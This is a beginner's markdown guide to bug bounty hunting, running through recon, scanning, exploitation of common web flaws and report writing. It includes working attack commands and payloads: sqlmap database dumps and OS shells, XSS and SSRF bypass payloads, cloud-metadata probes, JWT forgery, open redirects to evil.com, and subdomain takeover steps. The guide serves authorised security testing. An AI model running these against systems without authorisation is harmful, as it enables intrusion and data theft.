# Bug Bounty Hunting 
A bug bounty is a program in which an organization rewards people for finding and responsibly reporting security vulnerabilities or software bugs in its systems, applications, or websites.

## The idea is simple:

- A company defines which systems can be tested and what types of vulnerabilities are eligible.
- Security researchers (sometimes called ethical hackers) look for weaknesses.
- If they discover a valid vulnerability, they report it privately to the company.
- The company verifies the issue, fixes it, and may pay a reward (the "bounty").

## WHERE TO HUNT (PLATFORMS)

| Platform | URL | Notes |
|----------|-----|-------|
| **HackerOne** | hackerone.com | Largest, most programs |
| **Bugcrowd** | bugcrowd.com | Good for beginners |
| **Intigriti** | intigriti.com | European focus, quality programs |
| **Synack** | synack.com | Invite-only, pays well |
| **YesWeHack** | yeswehack.com | European programs |
| **Open Bug Bounty** | openbugbounty.org | XSS focused, free programs |

### Tips for Choosing Programs
- **New programs** = less competition, uncovered bugs
- **Scope size** — wider scope = more attack surface
- **Payout table** — check what they pay for what severity
- **Response time** — check program stats on HackerOne
---

### 1. METHODOLOGY OVERVIEW

Bug bounty hunting follows a structured process. Skipping steps leads to missing vulnerabilities.

```
Reconnaissance → Enumeration → Scanning → Exploitation → Reporting
```

### The Core Mindset
- Think like an attacker, not a developer
- Focus on **business logic** — not just technical bugs
- Go wide first (enumerate everything), then go deep
- Read the program scope carefully — stay in bounds
- Document everything as you go

---

## 2. PHASE 1 — RECONNAISSANCE

## Overview
Collect information about the target without direct interaction. Goal: Build a comprehensive profile while remaining undetected.

### 2.1 Passive Recon (No direct contact with target)

**What to find:** Subdomains, IPs, tech stack, emails, exposed credentials, old endpoints

**Tools & Usage:**

## Google Dorking (Advanced Search Operators)

**Purpose**: Find exposed sensitive information through search engines
**Key Google Dorks for Bug Bounty:**
```
# Find exposed directories
site:target.com intitle:"index of"

# Find configuration files
site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini

# Find database dumps
site:target.com ext:sql | ext:dbf | ext:mdb

# Find login pages
site:target.com inurl:login | inurl:signin | inurl:admin

# Find exposed documents
site:target.com ext:pdf | ext:doc | ext:xls | ext:ppt

# Find email addresses
site:target.com intext:"@target.com"

# Find subdomains
site:*.target.com

# Find exposed cameras
inurl:"/view/index.shtml" "Network Camera"
```
## theHarvester - Email & Subdomain Discovery

**Purpose**: Gather emails, subdomains, IPs, and URLs from public sources
```bash
# Basic scan using all sources
theHarvester -d target.com -b all

# Specific sources with limit
theHarvester -d target.com -b google,bing,linkedin,duckduckgo -l 500

# Save results to file
theHarvester -d target.com -b all -f output_file

# DNS brute force
theHarvester -d target.com -b all -n

```
## WHOIS Lookup

**Purpose**: Gather domain registration information

```bash
# Domain WHOIS
whois target.com

# IP WHOIS
whois 192.168.1.1
```
## Subdomain Reconnaissance

**Amass** 
amass enum -d target.com -o sub.txt

**Subfinder**
subfinder -d target.com -o sub.txt

**Sublist3r**
sublist3r -d target.com -o sub.txt

## Shodan - IoT & Exposed Services Search

**Purpose**: Find internet-connected devices and services

```bash
# Install shodan CLI
pip install shodan
shodan init YOUR_API_KEY

# Search by organization
shodan search "org:Target Company"

# Search by hostname
shodan search "hostname:target.com"

# Find specific services
shodan search "port:22 country:US"
shodan search "Apache city:London"

# Common searches:
shodan search "default password"
shodan search "port:3389 country:US"  # RDP
shodan search "port:445"  # SMB
```

### 2.2 Active Recon (Direct interaction with target)

Active probing to discover live systems, services, ports, and technologies. Direct interaction with target systems.
## Nmap - Network Mapper

**Purpose**: Port scanning, service detection, OS fingerprinting

**Basic Scans**
```bash
# Ping sweep (discover live hosts)
nmap -sn 192.168.1.0/24

# Reverse dns on a ranage 
nmap -sn --dns-server 8.8.8.8 192.168.1.0/24

# Scan all ports
nmap -p- 192.168.1.100

# Scan specific ports
nmap -p 80,443,22,21 192.168.1.100

# Scan port range
nmap -p 1-1000 192.168.1.100
```

**Service Detection**
```bash
# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

```

**Advanced Scanning**
```bash
# TCP SYN scan (stealth)
nmap -sS 192.168.1.100

# UDP scan
nmap -sU 192.168.1.100

# TCP connect scan
nmap -sT 192.168.1.100

# Bypass firewall
nmap -f 192.168.1.100  # Fragment packets
nmap -D RND:10 192.168.1.100  # Decoy scan

# Timing templates (faster/slower)
nmap -T4 192.168.1.100  # Faster
nmap -T1 192.168.1.100  # Slower (stealthy)
```

**NSE Scripts (Nmap Scripting Engine)**
```bash
# Default scripts
nmap -sC 192.168.1.100

# Vulnerability scripts
nmap --script vuln 192.168.1.100

# Specific script categories
nmap --script=auth 192.168.1.100
nmap --script=discovery 192.168.1.100
nmap --script=exploit 192.168.1.100

# Specific script
nmap --script=http-sql-injection 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**Practical Nmap Workflow**
```bash
# Discover live hosts
nmap -sn 192.168.1.0/24 -oN live_hosts.txt

# Quick scan of common ports
nmap -iL live_hosts.txt -F -oN quick_scan.txt

# Full Stealth + All Ports + Version Detection
nmap -sS -sV -sC -O -p- -T4; 192.168.56.101 -oN fullscan.txt

# Fast + Default Scripts + Version Detection

nmap -p <open_ports> -sV -sC 192.168.56.101 -oN detailed_scan.txt

# Vulnerability scanning
nmap --script vuln -p <open_ports> 192.168.56.101 -oN vuln_scan.txt

```
## Masscan - Fast Port Scanner

**Purpose**: Extremely fast port scanning for large networks

```bash
# Scan entire network for web servers
masscan 192.168.1.0/24 -p80,443 --rate=1000

# Scan all ports
masscan 192.168.1.100 -p0-65535 --rate=10000

# Banner grabbing
masscan 192.168.1.0/24 -p80,443 --banners
```

## Whatweb -**Detect cms, Framework, server info**
## Wapplyzer -
## Netcraft -

## 3. PHASE 2 — ENUMERATION

Goal: Map every endpoint, parameter, directory, and file.

### 3.1 Subdomain Enumeration

```bash
# Combine multiple tools for better coverage
subfinder -d target.com | tee subs.txt
amass enum -passive -d target.com >> subs.txt
cat subs.txt | sort -u > unique_subs.txt

# Check which are alive
cat unique_subs.txt | httpx -silent -o live_subs.txt
```

**Tools:**
- **Subfinder** — fast, uses passive sources
- **Amass** — more thorough, uses many data sources
- **httpx** — checks which subdomains are live (HTTP status)
- **Assetfinder** — `assetfinder --subs-only target.com`

### 3.2 Directory & File Bruteforcing

**Where to use:** After finding live hosts — look for hidden admin panels, backups, config files

| Tool | Command | Best Wordlist |
|------|---------|---------------|
| **ffuf** | `ffuf -u https://target.com/FUZZ -w wordlist.txt` | SecLists/Discovery/Web-Content/ |
| **Gobuster** | `gobuster dir -u https://target.com -w common.txt` | common.txt, directory-list-2.3-medium.txt |
| **Dirsearch** | `python3 dirsearch.py -u https://target.com` | Built-in wordlists |
| **Feroxbuster** | `feroxbuster -u https://target.com -w wordlist.txt` | Recursive by default |

**Important Wordlists (SecLists):**
```
/Discovery/Web-Content/common.txt
/Discovery/Web-Content/big.txt
/Discovery/Web-Content/raft-large-files.txt
/Discovery/DNS/subdomains-top1million-5000.txt
```

### 3.3 Parameter Discovery

**Where to use:** On each endpoint to find hidden GET/POST parameters

```bash
# Arjun — finds hidden HTTP parameters
arjun -u https://target.com/page -m GET

# ParamSpider — extracts params from Wayback Machine
python3 paramspider.py -d target.com

# x8 — fast parameter discovery
x8 -u "https://target.com/page?FUZZ=test" -w params.txt
```

### 3.4 JavaScript Analysis

JavaScript files often contain API keys, endpoints, and secrets.

```bash
# Extract JS files from a live site
katana -u https://target.com -js-crawl -o js_files.txt

# Search JS for secrets
python3 LinkFinder.py -i https://target.com -o results.html

# Grep for secrets in downloaded JS
grep -r "api_key\|secret\|password\|token" *.js
```

**Tool:** **SecretFinder** — finds secrets in JS files
```bash
python3 SecretFinder.py -i https://target.com/app.js -o cli
```

---

## 4. PHASE 3 — VULNERABILITY SCANNING

### 4.1 Automated Scanners

| Tool | Finds | Command |
|------|-------|---------|
| **Nuclei** | 5000+ vulnerability templates | `nuclei -u https://target.com -t ~/nuclei-templates/` |
| **Nikto** | Outdated software, misconfigs | `nikto -h https://target.com` |
| **WPScan** | WordPress vulns | `wpscan --url https://target.com --enumerate` |
| **SQLMap** | SQL injection | `sqlmap -u "https://target.com/page?id=1" --dbs` |
| **Dalfox** | XSS scanning | `dalfox url "https://target.com/search?q=test"` |

**Nuclei — Most Important Scanner:**
```bash
# Templates scanning
nuclei -u https://target.com -t ~/nuclei-templates/

# Scan with specific severity
nuclei -u https://target.com -severity critical,high

# Scan for specific vulnerability type
nuclei -u https://target.com -t cves/ -t exposures/

# Scan a list of URLs
nuclei -l live_subs.txt -t ~/nuclei-templates/
```
**Nikto - Web Server Scanner**

```bash
# Basic scan
nikto -h http://target.com -C all

# Scan with specific port
nikto -h http://target.com:8080

# SSL scan
nikto -h https://target.com -ssl

# Scan multiple hosts
nikto -h hosts.txt

# Tuning options (specific tests)
nikto -h http://target.com -Tuning 123456789
# Output to file

nikto -h http://target.com -o results.html -Format htm
```
### 4.2 Burp Suite — The Core Tool

**Where:** Used throughout every phase — intercepting, modifying, replaying requests

**Key Modules:**

| Module | Use |
|--------|-----|
| **Proxy** | Intercept all browser traffic |
| **Repeater** | Manually modify and resend requests |
| **Intruder** | Automated payload injection (fuzzing) |
| **Scanner** (Pro) | Automated vulnerability scanning |
| **Decoder** | Encode/decode Base64, URL, HTML |
| **Comparer** | Compare two responses side-by-side |
| **Collaborator** | Out-of-band detection (SSRF, XXE, blind SQLi) |

**Burp Workflow:**
1. Set browser proxy to `127.0.0.1:8080`
2. Browse the target — Burp captures all requests
3. Send interesting requests to Repeater (Ctrl+R)
4. Fuzz parameters using Intruder
5. Use Collaborator payload for blind vulnerabilities

---
### 4.3 SQLMap - SQL Injection Tool

**Purpose**: Automated SQL injection detection and exploitation

```bash
# Basic injection test
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=admin"

# Test specific parameter
sqlmap -u "http://target.com/page?id=1&cat=2" -p id

# Database enumeration
sqlmap -u "http://target.com/page?id=1" --dbs  # List databases
sqlmap -u "http://target.com/page?id=1" -D dbname --tables  # List tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns  # List columns
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump  # Dump data

# Using Burp request
# Save request to file from Burp
sqlmap -r request.txt

# Advanced options
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
sqlmap -u "http://target.com/page?id=1" --os-shell  # Get OS shell
sqlmap -u "http://target.com/page?id=1" --sql-shell  # Get SQL shell

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
```

### 4.4 XSStrike - XSS Detection

**Purpose**: Advanced XSS vulnerability scanner

```bash
# Install
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

# Basic scan
python xsstrike.py -u "http://target.com/search?q=test"

# Crawl and scan
python xsstrike.py -u "http://target.com" --crawl

# With custom payload
python xsstrike.py -u "http://target.com/search?q=test" --payload "<svg/onload=alert(1)>"
```

## 5. PHASE 4 — EXPLOITATION (TOP VULNERABILITIES)

### 5.1 Cross-Site Scripting (XSS)

**Where to look:** Search bars, comment fields, URL parameters, form inputs, headers reflected in page

**Types:**
- **Reflected XSS** — payload in URL, reflected immediately
- **Stored XSS** — payload saved in DB, affects all users
- **DOM XSS** — payload processed by JavaScript on client side

**Payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

**Tools:**
- **Dalfox:** `dalfox url "https://target.com/search?q=test"`
- **XSStrike:** `python3 xsstrike.py -u "https://target.com/?q=test"`
- **Burp Intruder:** Load XSS wordlist, fuzz the parameter

**Bypass Techniques:**
```html
<!-- Filter bypasses -->
<ScRiPt>alert(1)</ScRiPt>       <!-- Case variation -->
<script>alert`1`</script>        <!-- Backtick bypass -->
<img src=x oNerRoR=alert(1)>    <!-- Event handler case -->
&#x3C;script&#x3E;alert(1)      <!-- HTML encoding -->
```

---

### 5.2 SQL Injection

**Where to look:** Login forms, search fields, URL parameters (`?id=1`), order/sort parameters

**Detection:**
```
'        → syntax error = vulnerable
1' OR '1'='1  → always true
1 AND 1=2     → always false
```

**Manual Testing:**
```sql
-- Error-based
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--

-- Time-based (blind)
'; WAITFOR DELAY '0:0:5'--   (MSSQL)
'; SELECT SLEEP(5)--           (MySQL)
```

**SQLMap Usage:**
```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1"

# Extract databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Extract tables from database
sqlmap -u "..." -D database_name --tables

# Dump data
sqlmap -u "..." -D db -T users --dump

# POST request
sqlmap -u "https://target.com/login" --data="user=test&pass=test"

# From Burp request file
sqlmap -r request.txt --level=5 --risk=3
```

---

### 5.3 Server-Side Request Forgery (SSRF)

**Where to look:** URL parameters that fetch external resources, image URL fields, webhook URLs, PDF generators, import/export features

**Basic Payloads:**
```
http://127.0.0.1/
http://localhost/admin
http://169.254.169.254/latest/meta-data/   (AWS metadata)
http://metadata.google.internal/           (GCP metadata)
http://192.168.0.1/
```

**Blind SSRF — Use Burp Collaborator or interactsh:**
```bash
# interactsh-client generates a unique URL
interactsh-client
# Use the generated URL: https://xxxxx.oast.fun
# Paste it in the target's URL parameter
# If the server fetches it → SSRF confirmed
```

**Bypass Techniques:**
```
http://2130706433/        → decimal form of 127.0.0.1
http://0x7f000001/        → hex form of 127.0.0.1
http://[::1]/             → IPv6 localhost
http://127.0.0.1.nip.io/  → DNS rebinding
```

---

### 5.4 Insecure Direct Object Reference (IDOR)

**Where to look:** Any URL or parameter that references an object by ID
```
/api/users/123/profile
/download?file_id=456
/invoice/789
```

**Testing:**
1. Create two accounts (A and B)
2. As account A, note the object ID (e.g., order `1001`)
3. Switch to account B, access the same endpoint with account A's ID
4. If accessible → IDOR

**Automation with ffuf:**
```bash
# Fuzz user IDs
ffuf -u "https://target.com/api/users/FUZZ/data" \
     -w ids.txt \
     -H "Authorization: Bearer <your_token>" \
     -mc 200
```

---

### 5.5 Authentication & Session Bugs

**Where to look:** Login, password reset, 2FA, registration, OAuth flows

**Common Issues:**
- Password reset token not expiring
- No rate limiting on login → brute force
- Predictable tokens (sequential IDs)
- JWT vulnerabilities

**JWT Testing:**
```bash
# jwt_tool — test JWT vulnerabilities
python3 jwt_tool.py <token> -T    # Tamper the token
python3 jwt_tool.py <token> -X a  # Algorithm confusion attack (alg:none)
python3 jwt_tool.py <token> -C -d wordlist.txt  # Crack weak secret
```

**JWT Attack — Algorithm None:**
```
Change "alg": "HS256" → "alg": "none"
Remove the signature
→ Server might accept unsigned token
```

---

### 5.6 Broken Access Control

**Where to look:** Admin endpoints, privileged actions, role-based features

**Testing:**
```bash
# Access admin panel as regular user
curl -H "Authorization: Bearer <user_token>" https://target.com/admin/users

# Horizontal privilege escalation
# Change role in request body
{"role": "admin"}

# Try adding admin headers
X-Admin: true
X-Role: administrator
```

---

### 5.7 Open Redirect

**Where to look:** `?redirect=`, `?url=`, `?next=`, `?return=`, `?continue=` parameters

**Payloads:**
```
?redirect=https://evil.com
?url=//evil.com
?next=/\evil.com
?return=javascript:alert(1)
```

**Why it matters:** Used in phishing chains, can escalate to SSRF, OAuth token theft

---

### 5.8 Subdomain Takeover

**Where to look:** Subdomains pointing to unclaimed services (AWS S3, GitHub Pages, Heroku)

```bash
# subjack — automated subdomain takeover detection
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# can-i-take-over-xyz — check if service is claimable
# GitHub repo with list of vulnerable services
```

**Process:**
1. Find subdomain pointing to external service
2. Verify the service is unclaimed (404 on the service)
3. Register the resource on that service
4. Confirm takeover

---

## 6. TOOLS QUICK REFERENCE TABLE

| Tool | Category | Install | Key Use |
|------|----------|---------|---------|
| **Amass** | Recon | `apt install amass` | Subdomain enum |
| **Subfinder** | Recon | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` | Fast subdomains |
| **httpx** | Recon | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` | Check live hosts |
| **Nuclei** | Scanning | `go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest` | Vuln templates |
| **ffuf** | Fuzzing | `go install github.com/ffuf/ffuf@latest` | Dir/param fuzzing |
| **Burp Suite** | All phases | Download from portswigger.net | Proxy, manual testing |
| **SQLMap** | SQLi | `apt install sqlmap` | SQL injection |
| **Dalfox** | XSS | `go install github.com/hahwul/dalfox/v2@latest` | XSS scanning |
| **Nmap** | Recon | `apt install nmap` | Port scanning |
| **Katana** | Crawling | `go install github.com/projectdiscovery/katana/cmd/katana@latest` | JS/endpoint crawl |
| **Arjun** | Params | `pip3 install arjun` | Hidden params |
| **jwt_tool** | Auth | `git clone` from GitHub | JWT attacks |
| **interactsh** | OOB | `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` | Blind SSRF/XXE |
| **WPScan** | CMS | `gem install wpscan` | WordPress vulns |
| **subjack** | Takeover | `go install github.com/haccer/subjack@latest` | Subdomain takeover |

---

## 7. AUTOMATION WORKFLOW (FULL PIPELINE)

```bash
#!/bin/bash
TARGET="target.com"

# Step 1: Subdomain Discovery
subfinder -d $TARGET -silent | tee subs.txt
amass enum -passive -d $TARGET >> subs.txt
cat subs.txt | sort -u > unique_subs.txt

# Step 2: Live Host Detection
cat unique_subs.txt | httpx -silent -mc 200,301,302,403 -o live.txt

# Step 3: Directory Bruteforce on all live hosts
while read url; do
    ffuf -u $url/FUZZ -w /usr/share/wordlists/common.txt -o ${url//\//_}.json -of json
done < live.txt

# Step 4: Nuclei Scan
nuclei -l live.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei_results.txt

# Step 5: JS File Crawl
katana -l live.txt -js-crawl -o endpoints.txt
cat endpoints.txt | grep "\.js$" | while read js; do
    SecretFinder -i $js -o cli >> secrets.txt
done

echo "Done. Check nuclei_results.txt, secrets.txt"
```

---

## 8. BURP SUITE ESSENTIAL SETUP

### Install & Configure
1. Download from portswigger.net
2. Set browser proxy: `127.0.0.1:8080`
3. Install CA cert: Visit `http://burpsuite/` → Download CA → Install in browser

### Must-Have Extensions (BApp Store)
- **Autorize** — Test access control automatically across roles
- **Turbo Intruder** — Fast fuzzing (better than built-in Intruder)
- **Logger++** — Advanced request logging with grep
- **JWT Editor** — Decode, modify, and attack JWTs
- **Param Miner** — Find hidden parameters automatically
- **Active Scan++** — Enhanced scanner checks

### Key Shortcuts
```
Ctrl+R  → Send to Repeater
Ctrl+I  → Send to Intruder
Ctrl+S  → Send to Scanner (Pro)
Ctrl+U  → URL encode selected text
Ctrl+Shift+U → URL decode
```

---

## 9. REPORTING — HOW TO WRITE A GOOD REPORT

A clear report = higher payout. A vague report = rejected or lowered bounty.

### Report Structure
```
Title: [Vulnerability Type] in [Feature] leads to [Impact]
Example: "Stored XSS in comment field leads to account takeover"

Severity: Critical / High / Medium / Low / Informational

Summary:
- What the vulnerability is (1-2 sentences)
- Where it exists
- What an attacker can do

Steps to Reproduce:
1. Log in as a regular user
2. Navigate to /profile/settings
3. In the "Bio" field, enter: <script>alert(document.cookie)</script>
4. Save the profile
5. As another user, view the profile
6. Observe the XSS payload executes and cookies are exfiltrated

Proof of Concept:
- Screenshots / video of exploitation
- Request/response from Burp Suite

Impact:
- Explain the real-world business impact
- "An attacker can steal session cookies of any user who views the profile,
   leading to account takeover of all platform users"

Recommended Fix:
- Output encode user input before rendering in HTML
- Implement Content-Security-Policy headers

CVSS Score: (Optional but appreciated)
```

### CVSS Scoring (Quick Reference)
- **Critical** (9.0–10.0) — Remote code execution, unauthenticated full access
- **High** (7.0–8.9) — Account takeover, sensitive data exposure
- **Medium** (4.0–6.9) — Privilege escalation, limited data exposure
- **Low** (0.1–3.9) — Info disclosure, minimal impact

---

## 10. MOBILE APP TESTING (BONUS)

**Tools:**

| Tool | Use |
|------|-----|
| **MobSF** | Automated mobile app analysis (APK/IPA) |
| **Frida** | Dynamic instrumentation, hook functions at runtime |
| **Objection** | Frida-based, bypass SSL pinning, root detection |
| **apktool** | Decompile APK files |
| **jadx** | Java decompiler for Android APKs |
| **Drozer** | Android security assessment |

**Quick APK Analysis:**
```bash
# Decompile APK
apktool d app.apk -o output/

# Decompile to Java
jadx -d output/ app.apk

# Look for secrets in source code
grep -r "api_key\|secret\|password\|http://" output/
```

---

## 11. RESOURCES FOR LEARNING

- **PortSwigger Web Security Academy** — portswigger.net/web-security (free, best labs)
- **HackTheBox** — hackthebox.com (practice in real environments)
- **TryHackMe** — tryhackme.com (beginner friendly)
- **PayloadsAllTheThings** — github.com/swisskyrepo/PayloadsAllTheThings
- **SecLists** — github.com/danielmiessler/SecLists (wordlists for everything)
- **HackerOne Hacktivity** — Read disclosed reports to learn techniques
- **Bug Bounty Forum** — bugbountyforum.com

---


